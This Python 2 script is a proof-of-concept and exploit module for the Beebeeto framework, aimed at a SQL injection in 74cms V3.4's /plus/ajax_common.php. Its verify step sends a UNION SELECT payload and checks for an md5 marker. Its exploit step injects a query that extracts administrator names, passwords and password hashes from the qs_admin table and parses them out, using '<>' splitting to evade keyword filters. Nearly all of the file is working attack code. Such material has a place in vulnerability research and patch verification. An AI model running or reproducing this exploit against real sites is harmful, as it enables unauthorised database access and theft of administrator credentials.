#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0095',  # 由Beebeeto官方编辑
            'name': '74cms V3.4 /plus/ajax_common.php SQL注入漏洞 POC & Exploit',  # 名称
            'author': '大孩小孩',  # 作者
            'create_date': '2014-10-21',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '74cms',  # 漏洞所涉及的应用名称
            'vul_version': ['V3.4'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['74cms漏洞', 'SQL注入', 'php'],  # 漏洞相关tag
            'desc': '74cms V3.4.20140709 plus/ajax_common.php文件存在SQL注入漏洞。',  # 漏洞描述
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-070316',  # 参考链接
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + ("/plus/ajax_common.php?act=hotword&query=錦'%20a<>nd%201=2%20un<>"
                                                  "ion%20sel<>ect%201,md5(736482),3%23")
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = urllib2.Request(verify_url)
        response = urllib2.urlopen(request)
        content = response.read()
        if '5cee14937d463a819651c8e1c504613c' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    @classmethod
    def exploit(cls, args):
        vul_url = args['options']['target'] + "/plus/ajax_common.php"
        paload = ("?act=hotword&query=錦'%20a<>nd%201=2%20un<>ion%20sel<>ect%201,group_concat(admin_name,"
                  "0x3a,pwd,0x3a,pwd_hash),3%20fr<>om%20qs_admin%23")
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url
        request = urllib2.Request(vul_url + paload)
        response = urllib2.urlopen(request)
        content = response.read()
        pattern = re.compile(r'.*?\[\'(?P<username>[^<>]*?):(?P<password>[^<>]*?):(?P<pwdhash>[^<>]*?)\'\]',re.I|re.S)
        match = pattern.match(content)
        if match == None:
            args['success'] = False
            return args
        else:
            username = match.group('username').strip()
            password = match.group('password').strip()
            passwordhash = match.group('pwdhash').strip()
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            args['poc_ret']['Username'] = username
            args['poc_ret']['Password'] = password
            args['poc_ret']['PasswordHash'] = passwordhash
            return args
        args['success'] = False
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())